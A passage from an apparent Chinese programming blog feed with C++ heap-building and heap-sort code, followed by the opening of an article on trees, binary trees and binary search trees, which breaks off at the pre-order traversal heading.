<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildHeap</span><span class="hljs-params">(T*array,<span class="hljs-keyword">int</span> size)</span></span>&#123;<br>    <span class="hljs-keyword">delete</span> []m_heap;<br>    m_heap=array;<br>    m_capacity=size;<br>    m_heapSize=size--;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size<span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        <span class="hljs-comment">// 父节点索引</span><br>        <span class="hljs-keyword">int</span> index=i;<br>        <span class="hljs-comment">// 子节点索引</span><br>        <span class="hljs-keyword">int</span> child_index=<span class="hljs-number">2</span>*index+<span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// 下浮父节点parent          </span><br>        T parent=m_heap[index];<br><br>        <span class="hljs-comment">// 向下调整</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span>(child_index&gt;=size)<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">if</span>(child_index+<span class="hljs-number">1</span>&lt;size&amp;&amp;m_heap[child_index]&lt;m_heap[child_index+<span class="hljs-number">1</span>])<br>                child_index++;<br>            <span class="hljs-keyword">if</span>(parent&gt;=m_heap[child_index])<br>                <span class="hljs-keyword">break</span>;<br>            m_heap[index]=m_heap[child_index];<br><br>            index=child_index;<br>            child_index=index*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>;<br>        &#125;<br>        m_heap[index]=parent;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>虽然该方法复杂度可以说是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，但比第一种方法要快很多。</p>
<h4 id="堆排序"><a class="markdownIt-Anchor" href="#堆排序"></a> 堆排序</h4>
<p>利用最大堆可以对数组升序排序，最小堆可以对数组降序排序。堆排序通过每次“删除”（交换数组首尾元素）堆顶元素（最大/小值），再重新构建二叉堆，使得数组内元素由后往前依次减小，从而数组变得有序。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *array,<span class="hljs-keyword">int</span> size,<span class="hljs-keyword">int</span> i)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> index=i;<br>    <span class="hljs-keyword">int</span> child_index=<span class="hljs-number">2</span>*index+<span class="hljs-number">1</span>;            <br>    <span class="hljs-keyword">int</span> x=array[index];<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-keyword">if</span>(child_index&gt;=size)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(child_index+<span class="hljs-number">1</span>&lt;size&amp;&amp;array[child_index]&lt;array[child_index+<span class="hljs-number">1</span>])<br>            child_index++;<br>        <span class="hljs-keyword">if</span>(x&gt;=array[child_index])<br>            <span class="hljs-keyword">break</span>;<br>        array[index]=array[child_index];<br>        index=child_index;<br>        child_index=index*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>;<br>    &#125;<br>    array[index]=x;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HeapSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *array,<span class="hljs-keyword">int</span> size)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> index,child_index,parent,child;<br>    <span class="hljs-comment">// 构建堆，下到上</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size<span class="hljs-number">-1</span><span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        <span class="hljs-built_in">down</span>(array,size,i);<br>    &#125;<br>    <span class="hljs-comment">// 交换数据后重新构建堆，上到下</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = size<span class="hljs-number">-1</span>; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        <span class="hljs-built_in">swap</span>(array[i],array[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">down</span>(array,i,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-二叉查找树(BST)</title>
    <url>/bst-cpp/</url>
    <content><![CDATA[<p>在计算机科学中，树是一种<strong>非线性数据结构</strong>，树的种类有大致分为两类:<strong>无序树</strong>和<strong>有序树</strong>。有序树又分为二叉查找树、堆、左高树、AVL树、红黑树等。树是一种非常重要的数据结构，如C++ STL中的map底层实现原理是红黑树，Java (jdk1.8) HashMap更是采用了散列表+链表+红黑树。<br />
不过在讨论二叉查找树之前，我们需要了解树的一些基本知识。</p>
<span id="more"></span>
<h3 id="树"><a class="markdownIt-Anchor" href="#树"></a> 树</h3>
<p>一棵树t是一个<strong>非空</strong>的<strong>有限</strong>个元素的集合，其中一个元素为根(root)，若其余元素存在，则组成t的子树</p>
<p>如下图图3为仅有一个元素的树，且该元素为树的根(root)<br />
<img src="/uploads/images/data_structure/bst_cpp/01.png" alt="" /></p>
<h4 id="关于树的术语摘自维基百科"><a class="markdownIt-Anchor" href="#关于树的术语摘自维基百科"></a> 关于树的术语(摘自维基百科)</h4>
<p><strong>节点的度</strong>：一个节点含有的<strong>子树的个数</strong>称为该节点的度<br />
<strong>树的度</strong>：一棵树中，<strong>最大的节点度</strong>称为树的度<br />
<strong>叶节点或终端节点</strong>：<strong>度为零</strong>的节点，也就是没有节点的节点<br />
<strong>非终端节点或分支节点</strong>：<strong>度不为零</strong>的节点<br />
<strong>父亲节点或父节点</strong>：若一个节点<strong>含有子节点</strong>，则这个节点称为其子节点的父节点<br />
<strong>孩子节点或子节点</strong>：一个节点含有的子树的根节点称为该节点的子节点<br />
<strong>兄弟节点</strong>：具有<strong>相同父节点</strong>的节点互称为兄弟节点<br />
<strong>节点的层次</strong>：从根开始定义起，根为第1层，根的子节点为第2层，以此类推<br />
<font color=red><strong>深度</strong>：对于任意节点n,n的深度为从根到n的唯一路径长，根的深度为0</font><br />
<font color=red><strong>高度</strong>：对于任意节点n,n的高度为从n到<strong>叶子节点</strong>的<strong>最长路径长</strong>，所有树叶的高度为0</font><br />
<strong>堂兄弟节点</strong>：父节点在同一层的节点互为堂兄弟<br />
<strong>节点的祖先</strong>：从根到该节点所经分支上的所有节点<br />
<strong>子孙</strong>：以某节点为根的子树中任一节点都称为该节点的子孙<br />
<strong>森林</strong>：由m（m&gt;=0）棵<strong>互不相交</strong>的树的集合称为森林</p>
<p>高度和深度的区别其实不用太在意，不同的人有不同的定义。<br />
若有兴趣可以去stackoverflow <a href="https://stackoverflow.com/questions/2603692/what-is-the-difference-between-tree-depth-and-height">What is the difference between tree depth and height?<br />
</a> 看看</p>
<h3 id="二叉树"><a class="markdownIt-Anchor" href="#二叉树"></a> 二叉树</h3>
<p>定义：一棵二叉树(binary tree) t 是<strong>有限</strong>个元素的集合(可以为空)。当二叉树非空时，其中一个元素称为<strong>根</strong>，若存在其余元素，则分为两颗二叉树，分别称为 t 的<strong>左子树</strong>和<strong>右子树</strong></p>
<p>二叉树中每个元素的左子树和右子树是<strong>有序的</strong>，而树的子树是<strong>无序的</strong></p>
<h4 id="性质"><a class="markdownIt-Anchor" href="#性质"></a> 性质</h4>
<p>二叉树的性质有很多，这里仅列举其中的一些。</p>
<p>性质1：一棵二叉树有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>个元素，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">n&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，它有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>条边<br />
性质2：一棵二叉树的高度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">h\ge0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，它最少有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>个元素，最多有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>h</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^h-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.932438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个元素<br />
性质3：一棵二叉树有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>个元素，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">n&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，它的高度最大为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，最小高度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_2(n+1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">⌉</span></span></span></span>。<br />
性质4：设<strong>完全二叉树</strong>其中一个元素编号<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi mathvariant="normal">，</mi><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">i，1 \le i \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">i</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，则:</p>
<ul>
<li>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，则该元素为二叉树的根。若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69862em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，则其父节点的编号为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">⌊</mo><mfrac><mi>i</mi><mn>2</mn></mfrac><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor \frac{i}{2} \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.200664em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.855664em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span></span></span></li>
<li>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>i</mi><mo>&gt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">2i&gt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69862em;vertical-align:-0.0391em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，则该元素无左孩子。否则，其左孩子编号<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>i</mi></mrow><annotation encoding="application/x-tex">2i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span></span></span></span></li>
<li>若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn><mo>&gt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">2i+1&gt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，则该元素无右孩子。否则，其右孩子编号<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li>
</ul>
<p>当高度为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>的二叉树恰好有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mi>h</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^h-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.932438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个元素时，称为<strong>满二叉树</strong>。<br />
<img src="/uploads/images/data_structure/bst_cpp/02.png" alt="" /></p>
<p><strong>完全二叉树</strong>可以看作是满二叉树删除最底层最右边的元素后形成的一棵树。<br />
满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树<br />
<img src="/uploads/images/data_structure/bst_cpp/03.png" alt="" /></p>
<h4 id="二叉树描述"><a class="markdownIt-Anchor" href="#二叉树描述"></a> 二叉树描述</h4>
<p>二叉树描述既可以<strong>数组</strong>也可以用<strong>链表</strong>。其中用数组描述的一般是<strong>二叉堆</strong>，用链表描述的比较常用，适用范围广。因此本文主要是基于链表描述的二叉查找树来展开</p>
<h3 id="二叉查找树binary-search-tree"><a class="markdownIt-Anchor" href="#二叉查找树binary-search-tree"></a> 二叉查找树(Binary Search Tree)</h3>
<p>二叉查找树也可叫做二叉搜索树，其满足以下特征:</p>
<ul>
<li>每个元素有<strong>唯一</strong>的一个关键字</li>
<li><strong>左子树</strong>的元素的关键字<strong>小于</strong> <strong>根节点</strong>的关键字</li>
<li><strong>右子树</strong>的元素的关键字<strong>大于</strong> <strong>根节点</strong>的关键字</li>
<li>根节点的左右子树也是二叉查找树</li>
</ul>
<p><img src="/uploads/images/data_structure/bst_cpp/03.png" alt="" /></p>
<p>定义一个bst节点结构</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NodeEntry</span>&#123;</span><br>    <span class="hljs-keyword">int</span> key; <span class="hljs-comment">// 关键字</span><br>    T data; <span class="hljs-comment">// 数据域 </span><br>    NodeEntry *parent; <span class="hljs-comment">// 父节点</span><br>    NodeEntry *left_nodes; <span class="hljs-comment">// 左子树</span><br>    NodeEntry *right_nodes; <span class="hljs-comment">// 右子树</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>bst模板类</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">binaryTree</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> T value_type;<br>    <span class="hljs-keyword">typedef</span> T&amp; reference_type;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">const</span> T&amp; const_reference_type;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span>&amp; const_key_type;<br><br>    <span class="hljs-keyword">typedef</span> NodeEntry&lt;T&gt; NODE;<br>    <span class="hljs-keyword">typedef</span> NodeEntry&lt;T&gt;&amp; REF_NODE;<br>    <span class="hljs-keyword">typedef</span> NodeEntry&lt;T&gt;* PNODE;<br>    <span class="hljs-keyword">typedef</span> NodeEntry&lt;T&gt;* &amp; REF_PNODE;<br><span class="hljs-keyword">private</span>:<br>    PNODE m_NodeRoot;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">binaryTree</span>();<br>    <span class="hljs-built_in">binaryTree</span>(const_key_type  k,const_reference_type v);<br>    ~<span class="hljs-built_in">binaryTree</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Height</span><span class="hljs-params">(PNODE pNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Insert</span><span class="hljs-params">(REF_PNODE pNode,PNODE pNodeParent,const_key_type key,const_reference_type value)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Delete</span><span class="hljs-params">(PNODE pNode,const_key_type key)</span></span>;<br>    <span class="hljs-function">NodeEntry&lt;T&gt;* <span class="hljs-title">Search</span><span class="hljs-params">(PNODE pNode,const_key_type key)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ClearAll</span><span class="hljs-params">(REF_PNODE pNode)</span></span>;<br><br>    <span class="hljs-function">NodeEntry&lt;T&gt;* <span class="hljs-title">predecessor</span><span class="hljs-params">(NODE* pNode)</span></span>;<br>    <span class="hljs-function">NodeEntry&lt;T&gt;* <span class="hljs-title">successor</span><span class="hljs-params">(NODE* pNode)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PreOrder</span><span class="hljs-params">(NODE * pRootNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InOrder</span><span class="hljs-params">(NODE * pRootNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PostOrder</span><span class="hljs-params">(NODE * pRootNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">LevelOrder</span><span class="hljs-params">(NODE * pRootNode)</span></span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h4 id="遍历"><a class="markdownIt-Anchor" href="#遍历"></a> 遍历</h4>
<p>bst有三种遍历方式</p>
<ul>
<li>前序遍历</li>
<li>中序遍历</li>
<li>后序遍历</li>
<li>层级遍历</li>
</ul>
<h5 id="前序遍历"><a class="markdownIt-Anchor" href="#前序遍历"></a> 前序遍历</h5>
